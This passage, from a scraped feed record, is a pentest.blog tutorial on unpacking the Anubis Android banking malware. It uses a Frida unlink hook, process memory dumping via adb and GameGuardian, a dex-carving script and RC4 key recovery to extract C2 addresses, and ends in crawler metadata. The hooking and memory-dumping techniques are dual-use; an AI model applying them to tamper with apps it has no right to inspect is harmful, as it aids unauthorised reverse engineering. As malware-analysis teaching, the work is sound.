data-link=\"https://pentest.blog/?attachment_id=1589\" class=\"wp-image-1589\" srcset=\"https://pentest.blog/wp-content/uploads/155136004439210407.png 405w, https://pentest.blog/wp-content/uploads/155136004439210407-300x114.png 300w\" sizes=\"(max-width: 405px) 100vw, 405px\" />\n  </figure></li>\n</ul> \n<p>Unlink function takes one parameter, a pointer to filename. We can hook unlink with the help of findExportByName. Code is taken from <a href=\"https://www.fortinet.com/blog/threat-research/defeating-an-android-packer-with-frida.html\">https://www.fortinet.com/blog/threat-research/defeating-an-android-packer-with-frida.html</a> but I tweaked little bit so deleted file will be printed.</p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">var unlinkPtr = Module.findExportByName(null, 'unlink');\n\nInterceptor.replace(unlinkPtr, new NativeCallback( function (a){\n    console.log(\"[+] Unlink : \" + Memory.readUtf8String(ptr(a)))\n    }, 'int', ['pointer']));</pre> \n<p>Let’s run the script.</p> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/u.png\" alt=\"\" class=\"wp-image-1578\" srcset=\"https://pentest.blog/wp-content/uploads/u.png 832w, https://pentest.blog/wp-content/uploads/u-300x107.png 300w, https://pentest.blog/wp-content/uploads/u-768x273.png 768w\" sizes=\"(max-width: 832px) 100vw, 832px\" />\n</figure> \n<p>We intercepted the unlink call, since our script just replaced code of original function with console.log() , file will not be deleted from the file system. <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/2714.png\" alt=\"âœ”\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p> \n<p><strong>From Memory:</strong><br>Even when file is deleted from file system because file was loaded into process, we can get trails of the deleted file from memory of that process. Since Android inherits from Linux, we can use /proc/pid folder to give us information about memory regions of a specified process. Let’s look at our target with <code>cat /proc/pid/maps | grep dex</code> filtering the dex.</br></p> \n<ul class=\"wp-block-gallery columns-1 is-cropped\">\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/4-1024x113.png\" alt=\"\" data-id=\"1583\" data-link=\"https://pentest.blog/?attachment_id=1583\" class=\"wp-image-1583\" srcset=\"https://pentest.blog/wp-content/uploads/4-1024x113.png 1024w, https://pentest.blog/wp-content/uploads/4-300x33.png 300w, https://pentest.blog/wp-content/uploads/4-768x85.png 768w, https://pentest.blog/wp-content/uploads/4.png 1090w\" sizes=\"(max-width: 1024px) 100vw, 1024px\" />\n  </figure></li>\n</ul> \n<p>We have found the trails of dex files. Now we need to dump these sections.<br><br><strong>Dump the Memory with Gameguardian:</strong></br></br></p> \n<p>First way is by “cheating” <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> There is a tool called GameGuardian which is used in game hacking. You can do many interesting things with GameGuardian but we will only use dump mechanism for now.</p> \n<ul class=\"wp-block-gallery aligncenter columns-3 is-cropped\">\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/gg1.png\" alt=\"\" data-id=\"1586\" data-link=\"https://pentest.blog/?attachment_id=1586\" class=\"wp-image-1586\" srcset=\"https://pentest.blog/wp-content/uploads/gg1.png 594w, https://pentest.blog/wp-content/uploads/gg1-187x300.png 187w\" sizes=\"(max-width: 594px) 100vw, 594px\" />\n  </figure></li>\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/gg2.png\" alt=\"\" data-id=\"1585\" data-link=\"https://pentest.blog/?attachment_id=1585\" class=\"wp-image-1585\" srcset=\"https://pentest.blog/wp-content/uploads/gg2.png 611w, https://pentest.blog/wp-content/uploads/gg2-201x300.png 201w\" sizes=\"(max-width: 611px) 100vw, 611px\" />\n  </figure></li>\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/gg3.png\" alt=\"\" data-id=\"1584\" data-link=\"https://pentest.blog/?attachment_id=1584\" class=\"wp-image-1584\" srcset=\"https://pentest.blog/wp-content/uploads/gg3.png 602w, https://pentest.blog/wp-content/uploads/gg3-206x300.png 206w\" sizes=\"(max-width: 602px) 100vw, 602px\" />\n  </figure></li>\n</ul> \n<p>Let’s start by installing and running the APK. Then launch GameGuardian and select the app name from left upmost button. Select right upmost button and the one underneath it. Now you can see dump memory option in menu. Put the hex codes of regions or select regions by clicking arrow buttons and press save. Yay!<br>We can pull dumped regions with :<br><code>adb pull /storage/emulated/0/packer .</code> <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/2714.png\" alt=\"âœ”\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /><br>Then you will see 2 files in packer folder. <br><code>com.eqrxhpdv.cbunlkwsqtz-dfb5a000-e0080000.bin com.eqrxhpdv.cbunlkwsqtz-maps.txt</code><br><br>When examined with file command it detects our dex file as a data file.<br>We need to fix it by removing parts do not belong to our file.</br></br></br></br></br></br></br></p> \n<p><strong>Dump the Memory with Custom Tools:</strong><br>Thanks to <a href=\"https://twitter.com/theempire_h\">@theempire_h</a> we can dump regions of memory of the target app with a C program. <br><a href=\"https://github.com/CyberSaxosTiGER/androidDump/\">https://github.com/CyberSaxosTiGER/androidDump</a><br>Here is how to dump a region with androidDump.</br></br></br></p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">adb push androidDump /data/local/tmp\nadb shell\ncd /data/local/tmp\nchmod +x androidDump\n./androidDump appname</pre> \n<p>It dumps 3 blobs of data. <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/2714.png\" alt=\"âœ”\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /></p> \n<p>But after dumping it, <code>file</code> command still do not give us the correct type <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png\" alt=\"ðŸ™�\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> It turns out that we should modify the file a little bit. To find magic byte of dex I wrote this script.</p> \n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"generic\" data-enlighter-theme=\"\" data-enlighter-highlight=\"\" data-enlighter-linenumbers=\"\" data-enlighter-lineoffset=\"\" data-enlighter-title=\"\" data-enlighter-group=\"\">import binascii\nimport sys\nfilename = sys.argv[1]\nwith open(filename, 'rb') as f:\n    content = f.read()\nh = binascii.hexlify(content).split(b'6465780a')\nh.pop(0)\nh = b'6465780a' + b''.join(h)\ndex = open(sys.argv[1][:-4]+\".dex\",\"wb\")\ndex.write(binascii.a2b_hex(h))\ndex.close()\n</pre> \n<p><a href=\"https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/deDex.py\">https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/deDex.py</a><br>After running our script on the file, we open it.</br></p> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/tadaa_1.png\" alt=\"\" class=\"wp-image-1626\" srcset=\"https://pentest.blog/wp-content/uploads/tadaa_1.png 853w, https://pentest.blog/wp-content/uploads/tadaa_1-300x189.png 300w, https://pentest.blog/wp-content/uploads/tadaa_1-768x483.png 768w\" sizes=\"(max-width: 853px) 100vw, 853px\" />\n</figure> \n<div class=\"wp-block-image\">\n <figure class=\"aligncenter is-resized\">\n  <img src=\"https://pentest.blog/wp-content/uploads/yes.gif\" alt=\"\" class=\"wp-image-1653\" width=\"339\" height=\"458\" />\n </figure>\n</div> \n<p>We found our lost classes <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> </p> \n<p><strong>Statically: </strong><br>Here is a blog post explaining unpacking process from a different perspective. <a href=\"https://sysopfb.github.io/malware,/reverse-engineering/2018/08/30/Unpacking-Anubis-APK.html\">https://sysopfb.github.io/malware,/reverse-engineering/2018/08/30/Unpacking-Anubis-APK.html</a> <br>I found rc4 key with the help of stackTrace. But apparently searching for <code>^</code> value is a very efficient way to find RC4 routines for Anubis <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> <br>To find rc4 key easily in JADX, here is quick tip:</br></br></br></p> \n<ul>\n <li>search “% length”</li>\n <li>right click to method you are in, press find Usage</li>\n <li>bArr2 will be used as rc4 key to decrypt.</li>\n</ul> \n<p>Here is our sample’s decryption key as bArr2 . Does it look familiar?</p> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/barr_1.png\" alt=\"\" class=\"wp-image-1625\" srcset=\"https://pentest.blog/wp-content/uploads/barr_1.png 766w, https://pentest.blog/wp-content/uploads/barr_1-300x103.png 300w\" sizes=\"(max-width: 766px) 100vw, 766px\" />\n</figure> \n<p>With bArr2, we can decrypt the encrypted file from images folder of the APK. Here is a snippet for decrypting the file with bArr2 . Script takes 2 parameters, bArr2 and the encrypted file. For our case it is mediumcrop. APK files can be simply unzipped to access the content of it. <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/2714.png\" alt=\"âœ”\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /><br><br><a href=\"https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/anubis_manual.py\">https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/anubis_manual.py</a></br></br></p> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/dec.png\" alt=\"\" class=\"wp-image-1656\" srcset=\"https://pentest.blog/wp-content/uploads/dec.png 693w, https://pentest.blog/wp-content/uploads/dec-300x118.png 300w\" sizes=\"(max-width: 693px) 100vw, 693px\" />\n</figure> \n<p>After decrypting and unzipping, we get our dex.</p> \n<div class=\"wp-block-image\">\n <figure class=\"aligncenter is-resized\">\n  <img src=\"https://pentest.blog/wp-content/uploads/target_1.png\" alt=\"\" class=\"wp-image-1624\" width=\"417\" height=\"362\" srcset=\"https://pentest.blog/wp-content/uploads/target_1.png 454w, https://pentest.blog/wp-content/uploads/target_1-300x260.png 300w\" sizes=\"(max-width: 417px) 100vw, 417px\" />\n </figure>\n</div> \n<p>After extracting the config, there is one more step to get the address of c&amp;c server. Malware gets page source of the telegram address and changes Chinese characters with ASCII letters. It then processes the base64 string. After decoding base64, it uses <code>service</code> to decrypt data that encrypted with rc4 scheme. Here is a snippet for decrypting Chinese chars to c&amp;c addresses.</p> \n<p><a href=\"https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/solve_chinese.py\">https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/solve_chinese.py</a></p> \n<figure class=\"wp-block-image\">\n <img src=\"https://pentest.blog/wp-content/uploads/solve.png\" alt=\"\" class=\"wp-image-1649\" srcset=\"https://pentest.blog/wp-content/uploads/solve.png 594w, https://pentest.blog/wp-content/uploads/solve-300x46.png 300w\" sizes=\"(max-width: 594px) 100vw, 594px\" />\n</figure> \n<div class=\"wp-block-image\">\n <figure class=\"aligncenter\">\n  <img src=\"https://pentest.blog/wp-content/uploads/one-script-to-rule-them-all.jpg\" alt=\"\" class=\"wp-image-1674\" srcset=\"https://pentest.blog/wp-content/uploads/one-script-to-rule-them-all.jpg 400w, https://pentest.blog/wp-content/uploads/one-script-to-rule-them-all-150x150.jpg 150w, https://pentest.blog/wp-content/uploads/one-script-to-rule-them-all-300x300.jpg 300w, https://pentest.blog/wp-content/uploads/one-script-to-rule-them-all-60x60.jpg 60w\" sizes=\"(max-width: 400px) 100vw, 400px\" />\n </figure>\n</div> \n<p>I managed to decrypt the Anubis payload with Androguard without running the APK in an emulator! After dumping the dex file, my script will find the config class printing the c2 and the encryption key. Config class is in one of the <code>a,b or c</code> or in <code>ooooooooooooo{0,2}o</code> classes in newer versions.<br>By checking counts of “this” keywords in class source code I managed to decrypt all versions of anubis (lazy :P). Here is output of my script to get c2 and key from an Anubis sample. <a href=\"https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/getc2_imp.py\">https://github.com/eybisi/nwaystounpackmobilemalware/blob/master/getc2_imp.py</a></br></p> \n<ul class=\"wp-block-gallery columns-1 is-cropped\">\n <li class=\"blocks-gallery-item\">\n  <figure>\n   <img src=\"https://pentest.blog/wp-content/uploads/dump.png\" alt=\"\" data-id=\"1607\" data-link=\"https://pentest.blog/?attachment_id=1607\" class=\"wp-image-1607\" srcset=\"https://pentest.blog/wp-content/uploads/dump.png 851w, https://pentest.blog/wp-content/uploads/dump-300x64.png 300w, https://pentest.blog/wp-content/uploads/dump-768x164.png 768w\" sizes=\"(max-width: 851px) 100vw, 851px\" />\n  </figure></li>\n</ul> \n<h3>Conclusion</h3> \n<p>There are many ways to unpack mobile malware and trace packing mechanisms. We might see <code>dalvik.system.InMemoryDexClassLoader</code> used in the future. If this is used, delete hooks will not be able to catch dropped files because everything will be done in memory <img src=\"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png\" alt=\"ðŸ™‚\" class=\"wp-smiley\" style=\"height: 1em; max-height: 1em;\" /> But dumping memory will catch these methods. Knowing different ways always helps. If you have any question feel free to ask in comment section or through <a href=\"https://twitter.com/0xabc0\">@0xabc0</a><br><br>Cheers.</br></br></p> \n<p>Special thanks to <a href=\"https://twitter.com/godelx0\">@godelx0</a></p> \n<h3>Links &amp; References</h3> \n<p>Dropper sample:<br><a href=\"https://koodous.com/apks/3c35f97b9000d55a2854c86eb201bd467702100a314486ff1dbee9774223bf0e\">3c35f97b9000d55a2854c86eb201bd467702100a314486ff1dbee9774223bf0e</a><br>Anubis sample:<br><a href=\"https://koodous.com/apks/e01ed0befbc50eeedcde5b5c07bf8a51ab39c5b20ee6e1f5afe04e161d072f1d\">e01ed0befbc50eeedcde5b5c07bf8a51ab39c5b20ee6e1f5afe04e161d072f1d</a><br><a href=\"https://codeshare.frida.re/@razaina/get-a-stack-trace-in-your-hook/\">https://codeshare.frida.re/@razaina/get-a-stack-trace-in-your-hook/</a><br><a href=\"https://www.fortinet.com/blog/threat-research/defeating-an-android-packer-with-frida.html\">https://www.fortinet.com/blog/threat-research/defeating-an-android-packer-with-frida.html</a><br><a href=\"https://medium.com/@fs0c131y/reverse-engineering-of-the-anubis-malware-part-1-741e12f5a6bd\">https://medium.com/@fs0c131y/reverse-engineering-of-the-anubis-malware-</a><br><a href=\"https://medium.com/@fs0c131y/reverse-engineering-of-the-anubis-malware-part-1-741e12f5a6bd\">part-1-741e12f5a6bd</a><a href=\"https://koodous.com/apks/3c35f97b9000d55a2854c86eb201bd467702100a314486ff1dbee9774223bf0e\">3</a><br>All materials:<br><a href=\"https://github.com/eybisi/nwaystounpackmobilemalware\">https://github.com/eybisi/nwaystounpackmobilemalware</a></br></br></br></br></br></br></br></br></br></p> \n<p><br /></p>","descriptionType":"html","publishedDate":"Wed, 13 Mar 2019 07:49:20 +0000","feedId":11893,"bgimg":"https://pentest.blog/wp-content/uploads/mani.png","linkMd5":"da37f1bd44fa53bee31361a590ff07a1","bgimgJsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn47@2020_2/2020/08/25/01-41-27-694_6b0368f201fe5c53.webp","destWidth":766,"destHeight":572,"sourceBytes":69141,"destBytes":106316,"author":"Ahmet Bilal Can","articleImgCdnMap":{"https://pentest.blog/wp-content/uploads/mani.png":"https://cdn.jsdelivr.net/gh/myreaderx24/cdn47@2020_2/2020/08/25/01-41-27-694_6b0368f201fe5c53.webp","https://pentest.blog/wp-content/uploads/mzw9z.gif":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn56@2020_6/2020/08/25/01-41-49-021_f398abf9ec133225.webp","https://pentest.blog/wp-content/uploads/ppp_1.png":"https://cdn.jsdelivr.net/gh/myreaderx32/cdn100@2020_2/2020/08/25/01-41-46-957_9ff1e474beb4f601.webp","https://pentest.blog/wp-content/uploads/ppp_2.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn39@2020_2/2020/08/25/01-41-47-408_e0e42ce922379d2f.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/2714.png":"https://cdn.jsdelivr.net/gh/myreaderx12/cdn96@2020_4/2020/08/25/01-41-46-878_3aacffcaa1f56151.webp","https://pentest.blog/wp-content/uploads/del.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn71@2020_3/2020/08/25/01-41-47-265_a306b176bc765fad.webp","https://pentest.blog/wp-content/uploads/155136004439210407.png":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn56@2020_1/2020/08/25/01-41-46-920_22bc9996110382d0.webp","https://pentest.blog/wp-content/uploads/u.png":"https://cdn.jsdelivr.net/gh/myreaderx3/cdn80@2020_3/2020/08/25/01-41-47-272_59227b9e688630ff.webp","https://pentest.blog/wp-content/uploads/4-1024x113.png":"https://cdn.jsdelivr.net/gh/myreaderx22/cdn44@2020_1/2020/08/25/01-41-47-361_ae5b198508c8a98e.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","https://pentest.blog/wp-content/uploads/gg1.png":"https://cdn.jsdelivr.net/gh/myreaderx4/cdn36@2020_3/2020/08/25/01-41-48-614_408c0c507674f550.webp","https://pentest.blog/wp-content/uploads/gg2.png":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn80@2020_2/2020/08/25/01-41-48-368_2df77b27b30b5f86.webp","https://pentest.blog/wp-content/uploads/gg3.png":"https://cdn.jsdelivr.net/gh/myreaderx8/cdn59@2020_6/2020/08/25/01-41-48-188_6234b6118de594dc.webp","https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f641.png":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn83@2020_3/2020/08/25/01-41-48-191_4120538b5839114f.webp","https://pentest.blog/wp-content/uploads/tadaa_1.png":"https://cdn.jsdelivr.net/gh/myreaderx/cdn51@2020_4/2020/08/25/01-41-48-564_2c53ad92bce463aa.webp","https://pentest.blog/wp-content/uploads/yes.gif":"https://cdn.jsdelivr.net/gh/myreaderx33/cdn88@2020_1/2020/08/25/01-41-47-939_c218bbe9d2fc0196.webp","https://pentest.blog/wp-content/uploads/barr_1.png":"https://cdn.jsdelivr.net/gh/myreaderx16/cdn80@2020_6/2020/08/25/01-41-47-103_37b82d95f565e334.webp","https://pentest.blog/wp-content/uploads/dec.png":"https://cdn.jsdelivr.net/gh/myreaderx1/cdn4@2020_6/2020/08/25/01-41-47-311_7ade884078496bc9.webp","https://pentest.blog/wp-content/uploads/target_1.png":"https://cdn.jsdelivr.net/gh/myreaderx7/cdn95@2020_5/2020/08/25/01-41-47-229_33721a1eb2b5dfd4.webp","https://pentest.blog/wp-content/uploads/solve.png":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn88@2020_2/2020/08/25/01-41-48-566_586964589dff276d.webp","https://pentest.blog/wp-content/uploads/one-script-to-rule-them-all.jpg":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn19@2020_6/2020/08/25/01-41-47-003_3e4ee53134ad8a55.webp","https://pentest.blog/wp-content/uploads/dump.png":"https://cdn.jsdelivr.net/gh/myreaderx14/cdn7@2020_5/2020/08/25/01-41-47-134_b3b4cb74893e78a7.webp"},"publishedOrCreatedDate":1598319687287}],"record":{"createdTime":"2020-08-25 09:41:27","updatedTime":"2020-08-25 09:41:27","feedId":11893,"fetchDate":"Tue, 25 Aug 2020 01:41:27 +0000","fetchMs":566,"handleMs":1234,"totalMs":26581,"newArticles":0,"totalArticles":10,"status":1,"type":0,"ip":"52.200.54.195","hostName":"us-019.herokuapp.com","requestId":"cc981f759dec467b897c901d16fb37f2_11893","contentType":"application/rss+xml; charset=UTF-8","totalBytes":3151140,"bgimgsTotal":8,"bgimgsGithubTotal":8,"articlesImgsTotal":64,"articlesImgsGithubTotal":64,"successGithubMap":{"myreaderx8":3,"myreaderx14":2,"myreaderx15":3,"myreaderx7":2,"myreaderx16":2,"myreaderx6":2,"myreaderx10":2,"myreaderx4":2,"myreaderx32":2,"myreaderx11":3,"myreaderx33":2,"myreaderx3":2,"myreaderx12":2,"myreaderx2":2,"myreaderx1":2,"myreaderx13":1,"myreaderx30":2,"myreaderx31":2,"myreaderx18":2,"myreaderx19":3,"myreaderx":2,"myreaderx25":2,"myreaderx27":2,"myreaderx21":3,"myreaderx22":2,"myreaderx23":2,"myreaderx24":3,"myreaderx5oss":3,"myreaderx29":1},"failGithubMap":{}},"feed":{"createdTime":"2020-08-25 04:37:09","updatedTime":"2020-08-25 04:37:09","id":11893,"name":"Pentest Blog","url":"https://pentest.blog/feed/","subscriber":null,"website":null,"icon":"https://pentest.blog/wp-content/uploads/logo-favicon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx62/cdn85@2020_2/2020/08/25/01-41-26-539_f700cfcda4bd6232.png","description":"Inn for security folks","weekly":null,"link":"https://pentest.blog"},"noPictureArticleList":[],"tmpCommonImgCdnBytes":578046,"tmpBodyImgCdnBytes":2573094,"tmpBgImgCdnBytes":0,"extra4":{"start":1598319685265,"total":0,"statList":[{"spend":797,"msg":"获取xml内容"},{"spend":1234,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":1,"msg":"修正封面图上传失败重新上传"},{"spend":5228,"msg":"正文链接上传到cdn"}]},"extra5":64,"extra6":64,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"https://github.com/EgeBalci/MSF-Self-Defense/raw/master/poc.gif","sourceStatusCode":404,"sourceBytes":0,"destBytes":0,"feedId":11893,"totalSpendMs":153,"convertSpendMs":0,"createdTime":"2020-08-25 09:41:48","host":"us-010*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"https://github.com/EgeBalci/MSF-Self-Defense/raw/master/poc.gif","sourceStatusCode":404,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx/cdn0@2020_1/404.jpg","sourceBytes":0,"destBytes":0,"feedId":11893,"totalSpendMs":421,"convertSpendMs":0,"createdTime":"2020-08-25 09:41:48","host":"europe61*","referer":"https://pentest.blog/?p=1631","linkMd5ListStr":"f88146d0e07e8038814706acd9dc7e6b","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[404],"sourceSize":"0","destSize":"0"}],"extra10_invalidATagHrefValue":{"https://pentest.blog/?p=1502_#packer":"https://pentest.blog/?p=1502#packer","https://pentest.blog/?p=1502_#catch":"https://pentest.blog/?p=1502#catch","https://pentest.blog/?p=1502_#defeat":"https://pentest.blog/?p=1502#defeat"},"extra111_proxyServerAndStatMap":{"http://us-018.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-53.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-039.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://europe65.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-002.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe61.herokuapp.com/":{"failCount":1,"successCount":4,"resultList":[200,200,200,404,200]},"http://us-035.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-006.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-23.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://europe69.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-031.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://europe-57.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-010.herokuapp.com/":{"failCount":1,"successCount":3,"resultList":[200,200,404,200]},"http://us-023.herokuapp.com/":{"failCount":0,"successCount":4,"resultList":[200,200,200,200]},"http://us-014.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]},"http://us-027.herokuapp.com/":{"failCount":0,"successCount":3,"resultList":[200,200,200]}},"extra12ImgCdnSuccessResultVector":[{"code":1,"isDone":false,"source":"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f60a.png","sourceStatusCode":200,"destWidth":72,"destHeight":72,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx5oss/cdn64@2020_1/2020/08/25/01-41-27-387_ecea8533d7c020cb.webp","sourceBytes":796,"destBytes":1690,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":795,"convertSpendMs":5,"createdTime":"2020-08-25 09:41:27","host":"us-006*","referer":"https://pentest.blog/?p=2377","linkMd5ListStr":"635332ab66c916c9c645a68174c33f15,635332ab66c916c9c645a68174c33f15","githubUser":"myreaderx5oss","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"796 B","destSize":"1.7 KB","compressRate":"212.3%"},{"code":1,"isDone":false,"source":"https://s.w.org/images/core/emoji/12.0.0-1/72x72/1f642.png","sourceStatusCode":200,"destWidth":72,"destHeight":72,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx21/cdn56@2020_6/2020/08/25/01-41-27-434_818413be4c4fbce7.webp","sourceBytes":620,"destBytes":1362,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":869,"convertSpendMs":5,"createdTime":"2020-08-25 09:41:27","host":"us-031*","referer":"https://pentest.blog/?p=1502","linkMd5ListStr":"6e8364b2bd7691fdf6e9b97b38fddee5,6e8364b2bd7691fdf6e9b97b38fddee5,c887d466f740d170459712bf8a263e8b,fd88f7ad07bdc8fa1d2b7b147e3a9a42,fd88f7ad07bdc8fa1d2b7b147e3a9a42,1cb4056b55bc4aa1e4174035918387a5,6f9bfefd47ea932a7405bc89115da85d,635332ab66c916c9c645a68174c33f15,f88146d0e07e8038814706acd9dc7e6b,da37f1bd44fa53bee31361a590ff07a1,da37f1bd44fa53bee31361a590ff07a1,da37f1bd44fa53bee31361a590ff07a1,da37f1bd44fa53bee31361a590ff07a1,6f9bfefd47ea932a7405bc89115da85d","githubUser":"myreaderx21","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"620 B","destSize":"1.3 KB","compressRate":"219.7%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/screenshot_5.png","sourceStatusCode":200,"destWidth":1156,"destHeight":509,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx11/cdn59@2020_3/2020/08/25/01-41-27-821_c144bcf92dff1f83.webp","sourceBytes":56988,"destBytes":19758,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1282,"convertSpendMs":21,"createdTime":"2020-08-25 09:41:27","host":"us-018*","referer":"https://pentest.blog/?p=2407","linkMd5ListStr":"c887d466f740d170459712bf8a263e8b,c887d466f740d170459712bf8a263e8b","githubUser":"myreaderx11","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"55.7 KB","destSize":"19.3 KB","compressRate":"34.7%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/vestacp-1.png","sourceStatusCode":200,"destWidth":1433,"destHeight":138,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx15/cdn40@2020_4/2020/08/25/01-41-27-851_f3ca636ba5eac039.webp","sourceBytes":116660,"destBytes":35502,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1317,"convertSpendMs":39,"createdTime":"2020-08-25 09:41:27","host":"us-014*","referer":"https://pentest.blog/?p=2453","linkMd5ListStr":"fd88f7ad07bdc8fa1d2b7b147e3a9a42,fd88f7ad07bdc8fa1d2b7b147e3a9a42","githubUser":"myreaderx15","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"113.9 KB","destSize":"34.7 KB","compressRate":"30.4%"},{"code":1,"isDone":false,"source":"https://pentest.blog/wp-content/uploads/Structure-of-the-PE-optional-header-and-location-of-the-IAT.png","sourceStatusCode":200,"destWidth":845,"destHeight":408,"fixedGithubDest":"https://cdn.jsdelivr.net/gh/myreaderx19/cdn44@2020_5/2020/08/25/01-41-27-861_e19647a3bc859c9b.webp","sourceBytes":18377,"destBytes":25320,"targetWebpQuality":75,"feedId":11893,"totalSpendMs":1346,"convertSpendMs":13,"createdTime":"2020-08-25 09:41:27","host":"us-002*","referer":"https://pentest.blog/?p=1299","linkMd5ListStr":"1cb4056b55bc4aa1e4174035918387a5,1cb4056b55bc4aa1e4174035918387a5","githubUser":"myreaderx19","githubHttpCode":201,"extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[200],"sourceSize":"17.9 KB","destSize":"24.7 